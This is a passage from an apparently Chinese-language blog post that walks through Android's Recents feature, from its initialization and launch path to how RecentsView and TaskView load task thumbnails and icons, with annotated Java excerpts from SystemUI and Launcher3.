mIsHomeAndOverviewSame = <span class="literal">false</span>;</span><br><span class="line">    mOverviewIntent = mFallbackIntent;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该方法内部，会将mFallbackIntent赋值给mOverviewIntent，后续启动Recents会用到mOverviewIntent；</p><h4 id="6-OverviewCommandHelper-java"><a href="#6-OverviewCommandHelper-java" class="headerlink" title="6.OverviewCommandHelper.java"></a>6.OverviewCommandHelper.java</h4><p><strong>packages/apps/Launcher3/quickstep/recents_ui_overrides/src/com/android/quickstep/OverviewCommandHelper.java</strong><br>启动Recents的直接入口类，最终实现了onOverviewToggle()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">OverviewCommandHelper</span><span class="params">(Context context, RecentsAnimationDeviceState deviceState,</span></span><br><span class="line"><span class="params">            OverviewComponentObserver observer)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    mRecentsModel = RecentsModel.INSTANCE.get(mContext);</span><br><span class="line">    mOverviewComponentObserver = observer;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@BinderThread</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOverviewToggle</span><span class="params">()</span> &#123;</span><br><span class="line">   </span><br><span class="line">    ActivityManagerWrapper.getInstance()</span><br><span class="line">                .closeSystemWindows(CLOSE_SYSTEM_WINDOWS_REASON_RECENTS);</span><br><span class="line">    MAIN_EXECUTOR.execute(<span class="keyword">new</span> <span class="title class_">RecentsActivityCommand</span>&lt;&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上就是Recents功能在初始化过程中涉及到的关键类，用一张流程图总结一下：</p><p><img src="/images/20231202/20231202001.png"></p><h3 id="二-启动"><a href="#二-启动" class="headerlink" title="二.启动"></a>二.启动</h3><p>前面分析了初始化涉及到的关键类，系统启动后会启动SystemUI进程，然后进行一系列初始化，接下来看一下进入Recents的流程：<br>关于手势或Key按键触发这一块逻辑处理跟Android8.1处理是一样的，入口都是在PhoneWindowManager，咱们从Recents接收toggleRecentApps()分析：</p><h4 id="1-Recents-java-1"><a href="#1-Recents-java-1" class="headerlink" title="1.Recents.java"></a>1.Recents.java</h4><p><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/recents/Recents.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">toggleRecentApps</span><span class="params">()</span> &#123;</span><br><span class="line">   </span><br><span class="line">    mImpl.toggleRecentApps();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-OverviewProxyRecentsImpl-java-1"><a href="#2-OverviewProxyRecentsImpl-java-1" class="headerlink" title="2.OverviewProxyRecentsImpl.java"></a>2.OverviewProxyRecentsImpl.java</h4><p><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/recents/OverviewProxyRecentsImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">toggleRecentApps</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// If connected to launcher service, let it handle the toggle logic</span></span><br><span class="line">    <span class="type">IOverviewProxy</span> <span class="variable">overviewProxy</span> <span class="operator">=</span> mOverviewProxyService.getProxy();</span><br><span class="line">    <span class="keyword">if</span> (overviewProxy != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Runnable</span> <span class="variable">toggleRecents</span> <span class="operator">=</span> () -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (mOverviewProxyService.getProxy() != <span class="literal">null</span>) &#123;</span><br><span class="line">                    mOverviewProxyService.getProxy().onOverviewToggle();</span><br><span class="line">                    mOverviewProxyService.notifyToggleRecentApps();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                Log.e(TAG, <span class="string">&quot;Cannot send toggle recents through proxy service.&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//启动runnable</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在runnable内部会通过OverviewProxyService的getProxy()来获取到Launcher3端实现的IOveriewProxy对象引用，然后调用onOverviewToggle()方法：</p><h4 id="3-TouchInteractionService-java"><a href="#3-TouchInteractionService-java" class="headerlink" title="3.TouchInteractionService.java"></a>3.TouchInteractionService.java</h4><p><strong>packages/apps/Launcher3/quickstep/recents_ui_overrides/src/com/android/quickstep/TouchInteractionService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@BinderThread</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOverviewToggle</span><span class="params">()</span> &#123;</span><br><span class="line">    mOverviewCommandHelper.onOverviewToggle();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-OverviewCommandHelper-java"><a href="#4-OverviewCommandHelper-java" class="headerlink" title="4.OverviewCommandHelper.java"></a>4.OverviewCommandHelper.java</h4><p><strong>packages/apps/Launcher3/quickstep/recents_ui_overrides/src/com/android/quickstep/OverviewCommandHelper.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@BinderThread</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOverviewToggle</span><span class="params">()</span> &#123;</span><br><span class="line">   ActivityManagerWrapper.getInstance()</span><br><span class="line">                .closeSystemWindows(CLOSE_SYSTEM_WINDOWS_REASON_RECENTS);</span><br><span class="line">   MAIN_EXECUTOR.execute(<span class="keyword">new</span> <span class="title class_">RecentsActivityCommand</span>&lt;&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在执行onOverviewToggle()后，实际上是通过Executoe执行了RecentsActivityCommand：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">RecentsActivityCommand</span>&lt;T <span class="keyword">extends</span> <span class="title class_">StatefulActivity</span>&lt;?&gt;&gt; <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RecentsActivityCommand</span><span class="params">()</span> &#123;</span><br><span class="line">        mActivityInterface = mOverviewComponentObserver.getActivityInterface();</span><br><span class="line">      </span><br><span class="line">        <span class="comment">//预加载，Android8.1也有相同的逻辑</span></span><br><span class="line">        mRecentsModel.getTasks(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">         </span><br><span class="line">         <span class="comment">// Otherwise, start overview.</span></span><br><span class="line">         mListener = mActivityInterface.createActivityInitListener(<span class="built_in">this</span>::onActivityReady);</span><br><span class="line">         mListener.registerAndStartActivity(mOverviewComponentObserver.getOverviewIntent(),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">RemoteAnimationProvider</span>() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">public</span> AnimatorSet <span class="title function_">createWindowAnimation</span><span class="params">(</span></span><br><span class="line"><span class="params">                                RemoteAnimationTargetCompat[] appTargets,</span></span><br><span class="line"><span class="params">                                RemoteAnimationTargetCompat[] wallpaperTargets)</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> RecentsActivityCommand.<span class="built_in">this</span>.createWindowAnimation(appTargets,</span><br><span class="line">                                    wallpaperTargets);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;, mContext, MAIN_EXECUTOR.getHandler(),</span><br><span class="line">                    mAnimationProvider.getRecentsLaunchDuration());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>可以看到，最终是通过registerAndStartActivity()来启动了intent，前面分析到mOverviewComponentObserver.getOverviewIntent()对应的就是mFallbackIntent，最终启动了RecentsActivity；<br>用一张流程图总结一下：</p><p><img src="/images/20231202/20231202002.png"></p><h3 id="三-显示"><a href="#三-显示" class="headerlink" title="三.显示"></a>三.显示</h3><p>在启动RecentsActivity后，会显示最近任务列表，看一下具体工作流程：</p><h4 id="1-RecentsActivity-java"><a href="#1-RecentsActivity-java" class="headerlink" title="1.RecentsActivity.java"></a>1.RecentsActivity.java</h4><p><strong>frameworks/base/packages/SystemUI/legacy/recents/src/com/android/systemui/recents/RecentsActivity.java</strong><br>Recents显示Activity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">  </span><br><span class="line">    setupViews();</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setupViews</span><span class="params">()</span> &#123;</span><br><span class="line">    inflateRootView(R.layout.fallback_recents_activity);</span><br><span class="line">    setContentView(getRootView());</span><br><span class="line">    mDragLayer = findViewById(R.id.drag_layer);</span><br><span class="line">    mFallbackRecentsView = findViewById(R.id.overview_panel);</span><br><span class="line">    mActionsView = findViewById(R.id.overview_actions_view);</span><br><span class="line">    mDragLayer.recreateControllers();</span><br><span class="line">    mFallbackRecentsView.init(mActionsView);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RecentsActivity继承了StatefulActivity，有些方法实现是在父类里面执行的，在onCreate()里面执行setupViews()，初始化了FallbackRecentsView，FallbackRecentsView继承了RecentsView，主要逻辑都是在RecentsView里面实现的，直接看RecentsView的实现逻辑：</p><h4 id="2-RecentsView-java"><a href="#2-RecentsView-java" class="headerlink" title="2.RecentsView.java"></a>2.RecentsView.java</h4><p><strong>frameworks/base/packages/SystemUI/legacy/recents/src/com/android/systemui/recents/views/RecentsView.java</strong><br>Recents显示主View</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">RecentsView</span><span class="params">(Context context, AttributeSet attrs, <span class="type">int</span> defStyleAttr,</span></span><br><span class="line"><span class="params">            BaseActivityInterface sizeStrategy)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(context, attrs, defStyleAttr);</span><br><span class="line">    </span><br><span class="line">    mModel = RecentsModel.INSTANCE.get(context);</span><br><span class="line">    mClearAllButton = (ClearAllButton) LayoutInflater.from(context)</span><br><span class="line">                .inflate(R.layout.overview_clear_all_button, <span class="built_in">this</span>, <span class="literal">false</span>);</span><br><span class="line">    mClearAllButton.setOnClickListener(<span class="built_in">this</span>::dismissAllTasks);</span><br><span class="line">    mTaskViewPool = <span class="keyword">new</span> <span class="title class_">ViewPool</span>&lt;&gt;(context, <span class="built_in">this</span>, R.layout.task, <span class="number">20</span> <span class="comment">/* max size */</span>,</span><br><span class="line">                <span class="number">10</span> <span class="comment">/* initial size */</span>);</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在构造方法内部，获取了RecentsModel实例，创建了ViewPool实例mTaskViewPool，该mTaskViewPool存储TaskView，对应的layout为 R.layout.task，最大数量为20；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onAttachedToWindow</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onAttachedToWindow();</span><br><span class="line">    updateTaskStackListenerState();</span><br><span class="line">    ActivityManagerWrapper.getInstance().registerTaskStackListener(mTaskStackListener);</span><br><span class="line">    <span class="comment">//当snapshot更新时，会进行回调刷新UI</span></span><br><span class="line">    RecentsModel.INSTANCE.get(getContext()).addThumbnailChangeListener(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在RecentsView显示时会回调onAttachedToWindow()，在内部执行了updateTaskStackListenerState()，然后做了一些注册回调操作，当有变化时，会进行回调通知来更新UI；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateTaskStackListenerState</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">handleTaskStackChanges</span> <span class="operator">=</span> mOverviewStateEnabled &amp;&amp; isAttachedToWindow()</span><br><span class="line">                &amp;&amp; getWindowVisibility() == VISIBLE;</span><br><span class="line">    <span class="keyword">if</span> (handleTaskStackChanges != mHandleTaskStackChanges) &#123;</span><br><span class="line">        mHandleTaskStackChanges = handleTaskStackChanges;</span><br><span class="line">        <span class="keyword">if</span> (handleTaskStackChanges) &#123;</span><br><span class="line">            reloadIfNeeded();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在updateTaskStackListenerState()内部会进行一系列条件判断来确定是否执行reloadIfNeeded()，当首次进入时会执行reloadIfNeeded()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reloadIfNeeded</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!mModel.isTaskListValid(mTaskListChangeId)) &#123;</span><br><span class="line">        mTaskListChangeId = mModel.getTasks(<span class="built_in">this</span>::applyLoadPlan);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过RecentsModel的getTasks()来获取任务列表，然后回到applyLoadPlan()，getTasks()逻辑在后面进行分析，先看一下applyLoadPlan()方法的执行逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">applyLoadPlan</span><span class="params">(ArrayList&lt;Task&gt; tasks)</span> &#123;</span><br><span class="line">    <span class="comment">// Unload existing visible task data</span></span><br><span class="line">    unloadVisibleTaskData();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">requiredTaskCount</span> <span class="operator">=</span> tasks.size();</span><br><span class="line">    <span class="keyword">if</span> (getTaskViewCount() != requiredTaskCount) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> getTaskViewCount(); i &lt; requiredTaskCount; i++) &#123;</span><br><span class="line">            addView(mTaskViewPool.getView());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (requiredTaskCount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            addView(mClearAllButton);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Rebind and reset all task views</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> requiredTaskCount - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">pageIndex</span> <span class="operator">=</span> requiredTaskCount - i - <span class="number">1</span> + mTaskViewStartIndex;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Task</span> <span class="variable">task</span> <span class="operator">=</span> tasks.get(i);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">TaskView</span> <span class="variable">taskView</span> <span class="operator">=</span> (TaskView) getChildAt(pageIndex);</span><br><span class="line">        taskView.bind(task, mOrientationState);</span><br><span class="line">    &#125;</span><br><span class="line">    resetTaskVisuals();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在applyLoadPlan()内部，主要执行了四项工作：</p><ol><li>unloadVisibleTaskData()：将现有visible的task数据进行置空；</li><li>根据task数量(首次进入)进行addView，TaskView通过mTaskViewPool的getView()进行获取，最后添加clearAllButton；</li><li>对添加完的TaskView进行bind()操作，将对应的task存在TaskView内部，类似setTag()功能；</li><li>执行resetTaskVisuals()来刷新加载数据；<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">resetTaskVisuals</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Update the set of visible task&#x27;s data</span></span><br><span class="line">    loadVisibleTaskData();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">loadVisibleTaskData</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Update the task data for the in/visible children</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; getTaskViewCount(); i++) &#123;</span><br><span class="line">        <span class="type">TaskView</span> <span class="variable">taskView</span> <span class="operator">=</span> getTaskViewAt(i);</span><br><span class="line">        <span class="type">Task</span> <span class="variable">task</span> <span class="operator">=</span> taskView.getTask();</span><br><span class="line">         <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> indexOfChild(taskView);</span><br><span class="line">         <span class="type">boolean</span> <span class="variable">visible</span> <span class="operator">=</span> lower &lt;= index &amp;&amp; index &lt;= upper;</span><br><span class="line">         <span class="keyword">if</span> (visible) &#123;</span><br><span class="line">             <span class="keyword">if</span> (task == mTmpRunningTask) &#123;</span><br><span class="line">                <span class="comment">// Skip loading if this is the task that we are animating into</span></span><br><span class="line">                 <span class="keyword">continue</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span> (!mHasVisibleTaskData.get(task.key.id)) &#123;</span><br><span class="line">                 taskView.onTaskListVisibilityChanged(<span class="literal">true</span> <span class="comment">/* visible */</span>);</span><br><span class="line">             &#125;</span><br><span class="line">             mHasVisibleTaskData.put(task.key.id, visible);</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>最终在loadVisibleTaskData()里面通过TaskView的onTaskVisibilityChanged(true)来加载数据；</li></ol><h4 id="3-TaskView-java"><a href="#3-TaskView-java" class="headerlink" title="3.TaskView.java"></a>3.TaskView.java</h4><p>Recents列表中Task对应的显示View<br><strong>frameworks/base/packages/SystemUI/legacy/recents/src/com/android/systemui/recents/views/TaskView.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(Task task, RecentsOrientedState orientedState)</span> &#123;</span><br><span class="line">    mTask = task;</span><br><span class="line">    mSnapshotView.bind(task);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onTaskListVisibilityChanged</span><span class="params">(<span class="type">boolean</span> visible)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mTask == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        cancelPendingLoadTasks();</span><br><span class="line">    <span class="keyword">if</span> (visible) &#123;</span><br><span class="line">        <span class="comment">// These calls are no-ops if the data is already loaded, try and load the high</span></span><br><span class="line">        <span class="comment">// resolution thumbnail if the state permits</span></span><br><span class="line">        <span class="type">RecentsModel</span> <span class="variable">model</span> <span class="operator">=</span> RecentsModel.INSTANCE.get(getContext());</span><br><span class="line">        <span class="type">TaskThumbnailCache</span> <span class="variable">thumbnailCache</span> <span class="operator">=</span> model.getThumbnailCache();</span><br><span class="line">        <span class="type">TaskIconCache</span> <span class="variable">iconCache</span> <span class="operator">=</span> model.getIconCache();</span><br><span class="line">        mThumbnailLoadRequest = thumbnailCache.updateThumbnailInBackground(</span><br><span class="line">                    mTask, thumbnail -&gt; mSnapshotView.setThumbnail(mTask, thumbnail));</span><br><span class="line">        mIconLoadRequest = iconCache.updateIconInBackground(mTask,</span><br><span class="line">                    (task) -&gt; &#123;</span><br><span class="line">                        setIcon(task.icon);</span><br><span class="line">                        <span class="keyword">if</span> (ENABLE_QUICKSTEP_LIVE_TILE.get() &amp;&amp; isRunningTask()) &#123;</span><br><span class="line">                            getRecentsView().updateLiveTileIcon(task.icon);</span><br><span class="line">                        &#125;</span><br><span class="line">                        mDigitalWellBeingToast.initialize(mTask);</span><br><span class="line">                    &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            mSnapshotView.setThumbnail(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            setIcon(<span class="literal">null</span>);</span><br><span class="line">            <span class="comment">// Reset the task thumbnail reference as well (it will be fetched from the cache or</span></span><br><span class="line">            <span class="comment">// reloaded next time we need it)</span></span><br><span class="line">            mTask.thumbnail = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在onTaskListVisibilityChanged()内部，当visible为true时，执行mSnapshotView.setThumbnail()和setIcon()分别来加载缩略图和icon；当visible为false时，将其置空；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TaskView</span><span class="params">(Context context, AttributeSet attrs, <span class="type">int</span> defStyleAttr)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(context, attrs, defStyleAttr);</span><br><span class="line">    setOnClickListener((view) -&gt; &#123;</span><br><span class="line">         <span class="keyword">if</span> (getTask() == <span class="literal">null</span>) &#123;</span><br><span class="line">             <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         launchTask(<span class="literal">true</span> <span class="comment">/* animate */</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">launchTask</span><span class="params">(<span class="type">boolean</span> animate)</span> &#123;</span><br><span class="line">    launchTask(animate, <span class="literal">false</span> <span class="comment">/* freezeTaskList */</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">launchTaskInternal</span><span class="params">(<span class="type">boolean</span> animate, <span class="type">boolean</span> freezeTaskList,</span></span><br><span class="line"><span class="params">            Consumer&lt;Boolean&gt; resultCallback, Handler resultCallbackHandler)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mTask != <span class="literal">null</span>) &#123;</span><br><span class="line">        ActivityManagerWrapper.getInstance().startActivityFromRecentsAsync(mTask.key,</span><br><span class="line">                    opts, resultCallback, resultCallbackHandler);</span><br><span class="line">        getRecentsView().onTaskLaunched(mTask);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在TaskView内部设置了点击事件监听，当点击后会执行launchTask，最终会调用到ActivityManagerWrapper的startActivityFromRecentsAsync()来快速切换到对应的任务；</p><h4 id="4-RecentsModel-java"><a href="#4-RecentsModel-java" class="headerlink" title="4.RecentsModel.java"></a>4.RecentsModel.java</h4><p>Recents数据获取功能管理类<br><strong>packages/apps/Launcher3/quickstep/src/com/android/quickstep/RecentsModel.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">RecentsModel</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    mContext = context;</span><br><span class="line">    mTaskList = <span class="keyword">new</span> <span class="title class_">RecentTasksList</span>(MAIN_EXECUTOR,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">KeyguardManagerCompat</span>(context), ActivityManagerWrapper.getInstance());</span><br><span class="line">    mIconCache = <span class="keyword">new</span> <span class="title class_">TaskIconCache</span>(context, looper);</span><br><span class="line">    mThumbnailCache = <span class="keyword">new</span> <span class="title class_">TaskThumbnailCache</span>(context, looper);</span><br><span class="line">   ActivityManagerWrapper.getInstance().registerTaskStackListener(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight 